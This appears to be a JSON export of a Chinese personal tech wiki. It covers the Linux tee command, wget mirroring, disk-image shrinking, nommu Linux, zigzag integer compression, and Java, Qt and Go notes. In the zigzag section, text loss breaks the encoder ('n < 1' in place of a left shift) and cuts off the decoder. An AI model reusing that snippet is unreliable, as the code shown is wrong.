有时候，你会想手动跟踪命令的输出内容，同时又想将输出的内容写入文件，确保之后可以用来参考。如果你想寻找这相关的工具，那么恭喜你，Linux 已经有了一个叫做 tee 的命令可以帮助你。 本教程中，我们将基于 tee 命令，用一些简单的例子开始讨论。但是在此之前，值得一提的是，本文我们所有的测试实例都基于 Ubuntu 16.04 LTS。 Linux tee 命令tee 命令基于标准输入读取数据，标准输出或文件写入数据。感受下这个命令的语法： 1tee [OPTION]... [FILE]... 这里是帮助文档的说明： 从标准输入中复制到每一个文件，并输出到标准输出。 让 Q&A（问&答）风格的实例给我们带来更多灵感，深入了解这个命令。 Q1、 如何在 Linux 上使用这个命令？假设因为某些原因，你正在使用 ping 命令。 1ping google.com 如何在 Linux 上使用 tee 命令 然后同时，你想要输出的信息也同时能写入文件。这个时候，tee 命令就有其用武之地了。 1ping google.com | tee output.txt 下面的截图展示了这个输出内容不仅被写入 output.txt 文件，也被显示在标准输出中。 tee command 输出 如此应当明白了 tee 的基础用法。 Q2、 如何确保 tee 命令追加信息到文件中？默认情况下，在同一个文件下再次使用 tee 命令会覆盖之前的信息。如果你想的话，可以通过 -a 命令选项改变默认设置。 1[command] | tee -a [file] 基本上，-a 选项强制 tee 命令追加信息到文件。 Q3、 如何让 tee 写入多个文件？这非常之简单。你仅仅只需要写明文件名即可。 1[command] | tee [file1] [file2] [file3] 比如： 1ping google.com | tee output1.txt output2.txt output3.txt 如何让 tee 写入多个文件 Q4. 如何让 tee 命令的输出内容直接作为另一个命令的输入内容？使用 tee 命令，你不仅可以将输出内容写入文件，还可以把输出内容作为另一个命令的输入内容。比如说，下面的命令不仅会将文件名存入 output.txt 文件中，还会通过 wc 命令让你知道输入到 output.txt 中的文件数目。 1ls file* | tee output.txt | wc -l 如何让 tee 命令的输出内容直接作为另一个命令的输入内容 Q5. 如何使用 tee 命令提升文件写入权限？假如你使用 Vim 编辑器 打开文件，并且做了很多更改，然后当你尝试保存修改时，你得到一个报错，让你意识到那是一个 root 所拥有的文件，这意味着你需要使用 sudo 权限保存修改。 如何使用 tee 命令提升文件写入权限 如此情况下，你可以（在 Vim 内）使用 tee 命令来提高权限。 1:w !sudo tee % 上述命令会向你索要 root 密码，然后就能让你保存修改了。 Q6. 如何让 tee 命令忽视中断？-i 命令行选项使 tee 命令忽视通常由 ctrl+c 组合键发起的中断信号（SIGINT）。 1[command] | tee -i [file] 当你想要使用 ctrl+c 中断该命令，同时让 tee 命令优雅的退出，这个选项尤为实用。 总结现在你可能已经认同 tee 是一个非常实用的命令。基于 tee 命令的用法，我们已经介绍了其绝大多数的命令行选项。这个工具并没有什么陡峭的学习曲线，所以，只需跟随这几个例子练习，你就可以运用自如了。更多信息，请查看 帮助文档.","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"tools","slug":"计算机/linux/tools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/tools/"}]},{"title":"vi","date":"2019-06-08T00:00:00.000Z","path":"wiki/计算机/linux/tools/vi/","text":"不带格式复制（防复制东西时格式乱掉）1:set nosi noai","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"tools","slug":"计算机/linux/tools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/tools/"}]},{"title":"wget","date":"2019-06-08T00:00:00.000Z","path":"wiki/计算机/linux/tools/wget/","text":"用wget批量下载镜象站像经常能见到类似https://mirrors.edge.kernel.org/pub/的站点，偶尔下几个文件的话，浏览器直接下载就好，但如果想整个下载下来就很费力，可以用wget批量下载： 1wget -r -nd -np -l1 https://mirrors.xxxxx.org -nd 不创建目录, wget默认会创建一个目录-r 递归下载-l1 (L one) 递归一层,只下载指定文件夹中的内容, 不下载下一级目录中的","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"tools","slug":"计算机/linux/tools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/tools/"}]},{"title":"缩小镜象文件","date":"2019-06-08T00:00:00.000Z","path":"wiki/计算机/linux/tools/缩小镜象文件/","text":"12345678910# 创建回环设备，但不挂载losetup /dev/loop0 ./qt.img# 置零空闲数据zerofree -v /dev/loop0# 断开回环设备losetup -d /dev/loop0# 文件系统检查e2fsck -f qt.img# 缩减空间resize2fs -M qt.img","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"tools","slug":"计算机/linux/tools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/tools/"}]},{"title":"动态链接","date":"2019-06-08T00:00:00.000Z","path":"wiki/计算机/linux/动态链接/","text":"配置动态链接库目录的地方/etc/ld.so.conf，提示找不到库的时候修改。 1234# 刷新动态库高速缓存，安装新库之后找不到.so文件时执行sudo ldconfig# 打印缓存中的内容ldconfig -p 动态库搜索路径LD_LIBRARY_PATH 1export LD_LIBRARY_PATH=/xxx/lib/:$LD_LIBRARY_PATH","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"}]},{"title":"嵌入式linux升级相关","date":"2019-06-08T00:00:00.000Z","path":"wiki/计算机/linux/嵌入式linux升级相关/","text":"TODO: 安卓升级机制、备份系统https://mp.weixin.qq.com/s/pQQnyB4W0_LYSdtWpJuq1Q chroot，感觉可以用来做升级https://www.ibm.com/developerworks/cn/linux/l-cn-chroot/ 嵌入式系统中的镜像升级https://blog.csdn.net/silent123go/article/details/56495775?utm_source=blogkpcl6","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"}]},{"title":"构建","date":"2019-06-08T00:00:00.000Z","path":"wiki/计算机/linux/构建/","text":"TODO 拆分至工具 主要是这一篇http://blog.csdn.net/ruglcc/article/details/7814546/ http://blog.csdn.net/xukai871105/article/details/36476793http://www.cnblogs.com/luchen927/archive/2012/02/05/2339002.htmlhttp://wiki.ubuntu.org.cn/%E8%B7%9F%E6%88%91%E4%B8%80%E8%B5%B7%E5%86%99Makefile:MakeFile%E4%BB%8B%E7%BB%8D autotoolshttp://www.cppblog.com/liu1061/articles/54740.htmlhttp://blog.csdn.net/yygydjkthh/article/details/43197031http://www.ibm.com/developerworks/cn/linux/l-makefile/http://www.oschina.net/question/234345_42445 chibios对eclipse的配置http://www.chibios.org/dokuwiki/doku.php?id=chibios:guides:eclipse2","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"}]},{"title":"在无MMU的Linux下编程","date":"2019-06-08T00:00:00.000Z","path":"wiki/计算机/linux/在无mmu的linux下编程/","text":"原文：http://nommu.org/ 在无MMU的Linux下编程 nommu系统不使用 内存管理单元，它是将虚拟地址转换为物理地址的处理器的一部分。在nommu系统中，所有地址都是物理地址，这意味着： 没有需求错误：内存是由malloc（）直接分配的，它会更频繁地返回NULL。 在具有mmu的系统中，malloc（）实际上不分配内存。新的虚拟地址范围以“零页面”的冗余写时复制映射开始（因此所有读取都返回零但实际上一遍又一遍地从同一物理页读取），然后写入被截获并分配新内存根据页面错误处理程序的需要保存它们。 在mmu系统上，当进程耗尽虚拟地址空间时，malloc（）只返回零（这在32位系统上才真正发生，即使这样，每个进程也有几千兆字节）。实际的内存耗尽由OOM杀手处理。因此，mmu Linux程序员经常摆脱检查NULL的习惯，因为它几乎不会发生。（有关 如何在mmu情况下工作的详细信息，请参阅内存常见问题解答。） 一个nommu系统没有虚拟地址，任何“映射”只是跟踪分配了什么物理内存和什么是免费的内核。相反，对nommu的分配必须找到物理内存的连续区域，将其设置为零，并返回指向它开头的指针。这意味着如果malloc（）找不到足够大的连续内存块，它将返回NULL。 这意味着大量的推测映射，例如兆字节的堆栈“以防万一”，对于nommu来说是个坏主意。 所有程序文本都必须是可重定位的：所以我们不能使用标准的ELF二进制文件。 nommu系统中的每个进程都使用/看到相同的地址。大多数ELF程序指定映射每个段的地址，并且这些段中的代码/数据使用固定地址（以及其他详细信息，如程序的入口点）。这对nommu不起作用，因为您不知道系统上正在运行的其他程序，如果您想运行同一程序的两个实例，则每个实例都需要自己的bss和数据段。 因此，我们不同的连接方案，把.o文件到无论是一个binflt 二进制文件（文件格式，这是有点老的a.out二进制文件的重定位版本，使用内置 elf2flt工具），或FDPIC二进制文件（修改变种ELF所有东西都是可重定位的，基本上是静态PIE，扩展用于在进程之间共享文本和rodata段。无论哪种方式都需要知道如何生成这些输出格式的工具链，以及启用了相关二进制格式加载器（CONFIG_BINFMT_FLAT或CONFIG_BINFMT_ELF_FDPIC）的内核。 例如，对于sh2目标， 原住民Linux 项目使用uClibc构建binflt交叉编译器-sh2eb，而 musl-libc项目 使用musl构建fdpic工具链。 修复了编译时指定的堆栈大小 两种nommu输出格式都要求您在编译时指定显式堆栈大小，因为nommu系统无法自动增加堆栈（没有“保护页面”错误）。这些堆栈应该尽可能小，因为整个大小是在程序启动时分配的（需要连续的不可共享分配），如果系统无法获取该内存，则exec失败。默认大小（8k）基本上是内核堆栈。兆字节堆栈的标准Linux假设不适合用于nommu系统。 内存碎片是一个大问题 具有mmu的系统可以使用分散的物理页面填充虚拟映射，而不仅仅是对间隙进行光泽处理，而是将它们按顺序映射。 一个nommu系统需要一个连续的物理地址范围，这在具有大量现有分配的系统上可能很难实现。即使有大量的总可用内存，从中间分配的一小块将使可以满足的最大分配的大小减半。过了一会儿，最大可用内存块往往远远小于可用内存总量。 系统需要对程序代码，进程堆栈和环境空间进行连续分配，并满足malloc（）。这些分配越小，它们就越有可能适应分散系统上的可用块空间。（相反，您制作的长期分配越多，内存碎片就越多。） 因此，你的libc可能不会在堆中放置大的映射（这本身就是一个大的连续映射），但可能会要求内核mmap（）更大的分配，以便它们可以适应可用空间。（权衡是通过四舍五入到页面大小来扩大这种分配。） 没有fork（）：vfork（）而不是 使用fork会很昂贵，即使它几乎不可能：你必须将所有程序的可写数据复制到新的分配，并且很可能通过执行exec（）立即再次丢弃它们。 “几乎不可能”的部分是因为堆/堆栈的新副本中的任何指针都指向OLD堆/堆栈中的内存，因为每个进程都看到相同的地址。通过堆和堆栈重新定位所有这些指针结果非常困难（参见“C中的垃圾收集”）。 相反，我们使用vfork（），它在创建一个新的子进程时暂停父进程，这样子进程可以使用父进程（绝对是堆，它可能会也可能不会得到新的堆栈）。当子进程调用exec（）或_exit（）时，父进程将恢复。 vfork（）ed的子节点必须小心，不要破坏父的堆（并且不应该从调用vfork（）的函数返回，以防它使用相同的堆栈）。 如果孩子不能exec（）一个新进程，它应该调用_exit（）而不是exit（），因为第一个是系统调用，后者执行各种清理工作，如stdio刷新和运行atexit（）调用和析构函数是父进程的属性，而不是子进程的业务。 （类似地，由于内存碎片问题，brk（）系统调用的用处不大。在某些nommu系统上，brk（）只返回-ENOSYS。这主要是人们关心使用nommu支持实现C库。） 官方文档：https://github.com/torvalds/linux/blob/master/Documentation/nommu-mmap.txt","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"}]},{"title":"windows中遇到的问题","date":"2019-06-08T00:00:00.000Z","path":"wiki/计算机/windows/windows中遇到的问题/","text":"驱动安装不上比如提示“找不到指定的文件”，但又没提供什么有帮助的信息，那就得看日志了。 日志在setupapi.dev.log，根据日志找问题。 双网卡优先级设置关闭TCP/IP设置中的“自动跃点”，手动设置：高优先级：10低优先级：20","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"windows","slug":"计算机/windows","permalink":"http://wiki.noodlefighter.com/categories/计算机/windows/"}]},{"title":"elevator_schedule","date":"2019-06-08T00:00:00.000Z","path":"wiki/计算机/待整理/elevator-schedule/","text":"TODO 整理 电梯调度算法https://mp.weixin.qq.com/s/M_Sc4tBUzK0nK2eA3iF0mA","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"待整理","slug":"计算机/待整理","permalink":"http://wiki.noodlefighter.com/categories/计算机/待整理/"}]},{"title":"C语言静态检查","date":"2019-06-08T00:00:00.000Z","path":"wiki/计算机/编程/C/c语言静态检查/","text":"TODO https://github.com/ravenexp/splint http://clang-analyzer.llvm.org/ https://www.dwheeler.com/flawfinder/ https://www.dwheeler.com/essays/static-analysis-tools.html列表","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"编程","slug":"计算机/编程","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/"},{"name":"C","slug":"计算机/编程/C","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/C/"}]},{"title":"cmocka","date":"2019-06-08T00:00:00.000Z","path":"wiki/计算机/编程/C/cmocka/","text":"支持mock的C语言单元测试工具 TODO: https://cmocka.org","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"编程","slug":"计算机/编程","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/"},{"name":"C","slug":"计算机/编程/C","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/C/"}]},{"title":"压缩算法zigzag","date":"2019-06-08T00:00:00.000Z","path":"wiki/计算机/算法/压缩算法zigzag/","text":"作者： 简单的老王 SimpleMain;) via: https://mp.weixin.qq.com/s?__biz=MzA3MDExNzcyNA==&mid=2650392086&idx=1&sn=6a2ecfe2548f121a4726d03bf23f4478&scene=19#wechat_redirect 小而巧的数字压缩算法：zigzag阅读facebook开源的RPC（Remote Procedure Call）框架thrift源代码的时候，本来是在阅读框架，却不小心被zigzag这个钻石般闪耀的代码吸引。后来去百度搜索zigzag，却得到满屏图像相关的一个算法（看来起名字得有特点才行）。既然相关资料很少，而算法又这么有趣，老王就想要不写一篇这个算法的文章，分享给大家。 这个算法的java代码放在thrift的org.apache.thrift.protocol.TCompactProtocol类里，数据传输的时候用做数字的压缩，以减少数据的传输量。 为了写好这篇文章，同时方便大家阅读，老王把这个算法从thrift框架中摘离出来，清理了与算法无关的东西，然后用C语言重新实现了一遍，在文章末尾会完整的贴出来，大家可以围观。 好了，开始正题，跟老王一起来吧~ 在聊这个算法之前，我们得先补补课，聊聊进制、补码相关的东东。 1**、进制** 这个内容是作为码工挣钱最基础的知识之一。所谓进制，全称是进位制，就是当某一个位上的信息满了，需要往前进位。比如，某一位上的信息只能容纳十个，超过十个就往前进一位，则是逢十进一的十进制；如果逢二进一，则是二进制；等等。进制之间是可以转换的，比如十进制的10 等于 二进制的1010, 也等于十六进制的A，通常写作：(10)10 = (1010)2 = (A)16。 我之前看一本书就讲现在为什么大家通用的是十进制。一个比较有趣的答案说，因为人类只有10个手指头，数数的时候，挨个儿数过去刚好十个数，所以十进制自然而然成为默认的进制。如果人类是12个手指头，说不定就是十二进制了。 后来计算机的出现，一个数据的有无是最天然的信息承载单元，所以由0-1组成的二进制很天然的成为计算机的进制方式。在此基础上，为方便信息的传递，又采用了八进制、十六进制等进制。 好了，因为大家对进制这个东东其实也是比较了解，我就不多扯了，就先说到这儿。 2**、补码** 我们对一个十进制的正整数可以采用相关算法，得到他对应的二进制编码，比如：(10)10 = (1010)2 。不过，如果我们要表示负整数，怎么办呢？在计算机的世界里，我们就定义了原码、反码和补码这几个东东。 为了描述简单，我们都假设我们的数字用一个字节（1Byte=8bits）来表示。 A、原码 我们用第一个位表示符号（0为非负数，1为负数），剩下的位表示值。比如： [+8] = [00001000]原 [-8] = [10001000]原 B、反码 我们用第一位表示符号（0为非负数，1为负数），剩下的位，非负数保持不变，负数按位求反。比如： [+8] = [00001000]原 = [0000 1000]反 [-8] = [10001000]原 = [1111 0111]反 如果我们用原码或者补码来表示整数的二进制，有什么问题么？表面上看，似乎挺好的。不过仔细思考就会发现两个问题： 第一、0居然用两个编码（+0和-0）来表示了： 原码：[0000 0000]原 = [1000 0000]原 反码：[0000 0000]反 = [1111 1111]反 第二、计算机要理解符号位的存在，否则符号位参与运算，就会出现诡异的现象： 原码： 1 + （-1） = [00000001]原 + [1000 0001]原 = [10000010]原 = -2 明显是不对的！ 反码： 1 + （-1） = [00000001]反 + [1111 1110]反 = [1111 1111]反 = -0 表现的好诡异！ 为了解决这些问题，我们在计算机体系中引入了补码。 C、补码 我们用第一位表示符号（0为非负数，1为负数），剩下的位非负数保持不变，负数按位求反末位加一。 [+8] = [00001000]原 = [0000 1000]补 [-8] = [10001000]原 = [1111 1000]反 那我们再看看，把符号放进去做运算会有什么样的效果呢？ 1 + （-1） = [00000001]补 + [1111 1111]补 = [0000 0000]补 = 0 很明显，通过这样的方式，计算机进行运算的时候，就不用关心符号这个问题，而只需要按照统一的逢二进一的原则进行运算就可以了。 好了，脑补了进制和补码以后，我们就可以进入正题了。 3**、zigzag** 在绝大多数情况下，我们使用到的整数，往往是比较小的。比如，我们会记录一个用户的id、一本书的id、一个回复的数量等等。在绝大多数系统里面，他们都是一个小整数，就像1234、1024、100等。 而我们在系统之间进行通讯的时候，往往又需要以整型（int）或长整型（long）为基本的传输类型，他们在大多数系统中，以4Bytes和8Bytes来表示。这样，为了传输一个整型（int）1，我们需要传输00000000_00000000_00000000_00000001 32个bits，除了一位是有价值的1，其他全是基本无价值的0（此处发出一个声音：浪！费！啊！）。 那怎么办呢？牛逼的工程师想出了一个小而有趣的算法：zigzag！ 这个算法具体的思想是怎么样的呢？ 对于正整数来讲，如果在传输的时候，我们把多余的0去掉（或者是尽可能去掉无意义的0），传输有意义的1开始的数据，那我们是不是就可以做到数据的压缩了呢？那怎么样压缩无意义的0呢？ 答案也很简单，比如：00000000_00000000_00000000_00000001这个数字，我们如果能只发送一位1或者一个字节00000001，是不是就将压缩很多额外的数据呢？ 当然，如果这个世界只有正整数，我们就会很方便的做到这一点。可惜，他居然还有负数！！！负数长什么样呢？(-1)10 = (11111111_11111111_11111111_11111111)补，前面全是1，你说怎么弄？！ zigzag给出了一个很巧的方法：我们之前讲补码讲过，补码的第一位是符号位，他阻碍了我们对于前导0的压缩，那么，我们就把这个符号位放到补码的最后，其他位整体前移一位： (-1)10 =(11111111_11111111_11111111_11111111)补 =(11111111_11111111_11111111_11111111)符号后移 但是即使这样，也是很难压缩的，因为数字绝对值越小，他所含的前导1越多。于是，这个算法就把负数的所有数据位按位求反，符号位保持不变，得到了这样的整数： (-1)10 = (11111111_11111111_11111111_11111111)补 = (11111111_11111111_11111111_11111111)符号后移 = (00000000_00000000_00000000_00000001)zigzag 而对于非负整数，同样的将符号位移动到最后，其他位往前挪一位，数据保持不变。 (1)10 = (00000000_00000000_00000000_00000001)补 = (00000000_00000000_00000000_00000010)符号后移 = (00000000_00000000_00000000_00000010)zigzag 唉，这样一弄，正数、0、负数都有同样的表示方法了。我们就可以对小整数进行压缩了，对吧~ 这两种case，合并到一起，就可以写成如下的算法： 整型值转换成zigzag值： int int_to_zigzag(int n) { ​ return (n < 1) ^ (n >> 31);> 31: 将符号位放到最后一位。如果是非负数，则为全0；如果是负数，就是全1。 (1)10 = (00000000_00000000_00000000_00000001)补 右移31位 => (00000000_00000000_00000000_00000000)补 (-1)10 = (11111111_11111111_11111111_11111111)补 右移31位 => (11111111_11111111_11111111_11111111)补 最后这一步很巧妙，将两者进行按位异或操作： (1)10 => (00000000_00000000_00000000_00000010)补 ^ (00000000_00000000_00000000_00000000)补 = (00000000_00000000_00000000_00000010)补 可以看到最终结果，数据位保持不变，而符号位也保持不变，只是符号位移动到了最后一位 (-1)10 => (11111111_11111111_11111111_11111110)补 ^ (11111111_11111111_11111111_11111111)补 = (00000000_00000000_00000000_00000001)补 可以看到，数据位全部反转了，而符号位保持不变，且移动到了最后一位。 就是这一行代码，就将这个相对复杂的操作做完了，真是写的巧妙。 zigzag值还原为整型值： int zigzag_to_int(int n) { ​ return (((unsigned int)n) >> 1) ^ -(n & 1); } 类似的，我们还原的代码就反过来写就可以了。不过这里要注意一点，就是右移的时候，需要用不带符号的移动，否则如果第一位数据位是1的话，就会补1。所以，代码里用了无符号的右移操作：(((unsigned int)n) >> 1)。在java代码里，对应的移位操作：n >>> 1。 好了，有了算法对数字进行转换以后，我们就得到了有前导0的另外一个整数了。不过他还是一个4字节的整数，我们接下来就要考虑怎么样将他们表示成尽可能少的字节数，并且还能还原。 比如：我们将1转换成(00000000_00000000_00000000_00000010)zigzag这个以后，我们最好只需要发送2bits（10），或者发送8bits（00000010），把前面的0全部省掉。因为数据传输是以字节为单位，所以，我们最好保持8bits这样的单位。所以我们有几种做法： A、我们可以额外增加一个字节，用来表示接下来有效的字节长度，比如：00000001_00000010,前8位表示接下来有1个字节需要传输，第二8位表示真正的数据。这种方式虽然能达到我们想要的效果，但是莫名的增加一个字节的额外浪费。有没有不浪费的办法呢？ B、字节自表示方法。zigzag引入了一个方法，就是用字节自己表示自己。具体怎么做呢？我们来看看代码： int write_to_buffer(int zz, byte* buf, int size) { ​ int ret = 0; ​ for (int i = 0; i < size; i++) ​ { ​ if ((zz & (~0x7f)) == 0) ​ { ​ buf[i] = (byte)zz; ​ ret = i + 1; ​ break; ​ } ​ else ​ { ​ buf[i] = (byte)((zz & 0x7f) | 0x80); ​ zz = ((unsigned int)zz)>> 7; ​ } ​ } ​ return ret; } 大家先看看代码里那个(~0x7f)，他究竟是个什么数呢？ (~0x7f)16 =(11111111_11111111_11111111_10000000)补 他就是从倒数第八位开始，高位全为1的数。他的作用，就是看除开最后七位后，还有没有信息。 我们把zigzag值传递给这个函数，这个函数就将这个值从低位到高位切分成每7bits一组，如果高位还有有效信息，则给这7bits补上1个bit的1（0x80）。如此反复 直到全是前导0，便结束算法。 举个例来讲： (-1000)10 = (11111111_11111111_11111100_00011000)补 = (00000000_00000000_00000111_11001111)zigzag 我们先按照七位一组的方式将上面的数字划开： (0000-0000000-0000000-0001111-1001111)zigzag A、他跟(~0x7f)做与操作的结果，高位还有信息，所以，我们把低7位取出来，并在倒数第八位上补一个1(0x80)：11001111 B、将这个数右移七位：(0000-0000000-0000000-0000000-0001111)zigzag C、再取出最后的七位，跟(~0x7f)做与操作，发现高位已经没有信息了（全是0），那么我们就将最后8位完整的取出来：00001111，并且跳出循环，终止算法； D、最终，我们就得到了两个字节的数据[11001111, 00001111] 通过上面几步，我们就将一个4字节的zigzag变换后的数字变成了一个2字节的数据。如果我们是网络传输的话，就直接发送这2个字节给对方进程。对方进程收到数据后，就可以进行数据的组装还原了。具体的还原操作如下： int read_from_buffer(byte* buf, int max_size) { ​ int ret = 0; ​ int offset = 0; ​ for (int i = 0; i < max_size; i++, offset += 7) ​ { ​ byte n = buf[i]; ​ if ((n & 0x80) != 0x80) ​ { ​ ret |= (n","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"算法","slug":"计算机/算法","permalink":"http://wiki.noodlefighter.com/categories/计算机/算法/"}]},{"title":"java_runtime","date":"2019-06-08T00:00:00.000Z","path":"wiki/计算机/编程/JAVA/java-runtime/","text":"oracle java官方东西 openjre社区开源东西 Correttoamazon家的东西，开源，据说最好用","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"编程","slug":"计算机/编程","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/"},{"name":"JAVA","slug":"计算机/编程/JAVA","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/JAVA/"}]},{"title":"QTableWidget","date":"2019-06-08T00:00:00.000Z","path":"wiki/计算机/编程/QT/qtablewidget/","text":"QTableWidgetItem设置编辑状态 via: https://blog.csdn.net/sinat_27593959/article/details/53048614 通过QTableWidget中的item( )方法可以获得相应行数和列数的QTableWidgetItem，若要设置该Item的编辑状态（即可编辑状态和不可编辑状态），可以通过QTableWidgetItem下的setflags函数来设置。setflags函数需要传入的参数为枚举型的Qt::ItemFlags，该枚举类型描述如下： 12345678910111213enumItemFlag{ NoItemFlags=0, ItemIsSelectable=1, ItemIsEditable=2, ItemIsDragEnabled=4, ItemIsDropEnabled=8, ItemIsUserCheckable=16, ItemIsEnabled=32, ItemIsTristate=64, ItemNeverHasChildren=128, ItemIsUserTristate=256}; 通过需要表格框状态可分为如下三种：灰色不可编辑状态、浅色不可编辑状态和浅色可双击编辑状态，而setflags的参数传入可以通过强制类型转换的方式。即对应于如下： 灰色不可编辑状态：Item.setflags((ItemFlags) 0);浅色不可编辑状态：Item.setflags((ItemFlags) 32);浅色可双击编辑状态：Item.setflags((ItemFlags) 63); （注意：此处为63，不是64。虽然枚举类型中没有对应于63的值，但是63是QTableWidget实体创建的时候给每个Item的初始化flags值。设置成它就是可编辑状态！）","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"编程","slug":"计算机/编程","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/"},{"name":"QT","slug":"计算机/编程/QT","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/QT/"}]},{"title":"java_web","date":"2019-06-08T00:00:00.000Z","path":"wiki/计算机/编程/JAVA/java-web/","text":"http://wiki.jikexueyuan.com/project/spring/ioc-containers.htmlhttps://www.cnblogs.com/hisen/p/6800365.html https://spring.io/guides/gs/rest-service/https://spring.io/understanding/REST 博客实现https://blog.csdn.net/xp541130126/article/details/70665917 SwaggerUI API接口文档 IoC控制反转，IoC容器=控制反转容器 数据访问对象 (DAO) 模式 学习笔记，边学边写。 初探Web在这之前，对于当前的Web技术认识都来源于和程序员朋友的日常聊天，什么前后端分离，MVC，MVVM，Control，面向切片编程，都是道听途说云里雾里。 很久以前，站长们只需要一个能存放动态网页的虚拟主机和sql数据库服务器就能满足需要，把网页（html, asp, php文件）放进主机空间，少许配置就能跑起。 但现在做网站，很多时候需要用到VPS，因为有些网站程序已经不只是动态网页脚本，比如使用了一些框架Node.JS、flask（python）、ROR（ruby）需要在服务器上运行程序。 趁现在在家里蹲着，试着扩展一下技能树，从主流的Java Web入手学习，顺便做个just for fun的小项目： 云表情包的后端系统 多用户 用户可以上传表情，上传相同表情时自动选取合适的高考 Java Web似乎主流就俩组合：SSH = Struts+Spring+HibernateSSM = Spring+SpringMVC+MyBatis 据说SSM略新，就从它下手吧，逐个先看看是个什么东西。 Spring主页逛逛。 1End-to-end support for reactive & servlet based apps on the JVM. 根据描述reactive响应式的架构是5.0支持的新东西，并发性能强，先不理会。 重点在servlet上，“JVM上基于servlet的应用”是个什么东西呢？查wiki可知servlet就是实现了servlet的类，用于服务器程序收到客户端请求时执行做些处理后返回数据，wiki里描述它的工作模式： 1234工作模式1. 客户端发送请求至服务器2. 服务器启动并调用Servlet，Servlet根据客户端请求生成响应内容并将其传给服务器3. 服务器将响应返回客户端 SpringMVCMVC就是模型Model、视图View、控制器Controller，分离了业务数据、界面显示和业务逻辑。 当 模型负责 MyBatis官方文档 一款持久层框架，能避免手写JDBC代码，使用简单的XML和注解类配置和映射原生信息，将接口和Java对象映射成数据库中的记录。 查资料的过程中遇到的相关东西熟悉的面孔Apache Tomcat，一个Web服务器，这里有IBM的一篇文章介绍了Tomcat和Servlet体系，功能： 跑JSP，能把JSP转换成对应Servlet 提供Servlet引擎 maven，用于管理依赖，目前理解为java世界的包管理器。 druid，阿里的数据源，连接池。 Spring Boot能帮助快速建立","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"编程","slug":"计算机/编程","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/"},{"name":"JAVA","slug":"计算机/编程/JAVA","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/JAVA/"}]},{"title":"go记录","date":"2019-06-08T00:00:00.000Z","path":"wiki/计算机/编程/go/go记录/","text":"取程序运行路径路径golang，执行路径 123456789101112import ( \"path/filepath\" \"strings\")func getCurrentDirectory() string { dir, err := filepath.Abs(filepath.Dir(os.Args[0])) if err != nil { return \"\" } return strings.Replace(dir, \"\\\\\", \"/\", -1)} 要注意用go run的方式启动时，该方法拿不到正确的路径，因为它帮我们编译到了临时目录里。 日志 via: https://my.oschina.net/robin3d/blog/1862755 123456789101112131415161718192021222324252627package mainimport ( \"log\" \"os\")var logger *log.Loggerfunc main() { file, err := os.OpenFile(\"test.log\", os.O_APPEND|os.O_CREATE, 666) if err != nil { log.Fatalln(\"fail to create test.log file!\") } defer file.Close() logger = log.New(file, \"\", log.LstdFlags|log.Lshortfile) // 日志文件格式:log包含时间及文件行数 log.Println(\"输出日志到命令行终端\") logger.Println(\"将日志写入文件\") logger.SetFlags(log.LstdFlags | log.Lshortfile) // 设置日志格式 log.Panicln(\"在命令行终端输出panic，并中断程序执行\") logger.Panicln(\"在日志文件中写入panic，并中断程序执行\") log.Fatal(\"在命令行终端输出日志并执行os.exit(1)\") logger.Fatal(\"在日志文件中写入日志并执行os.exit(1)\")} 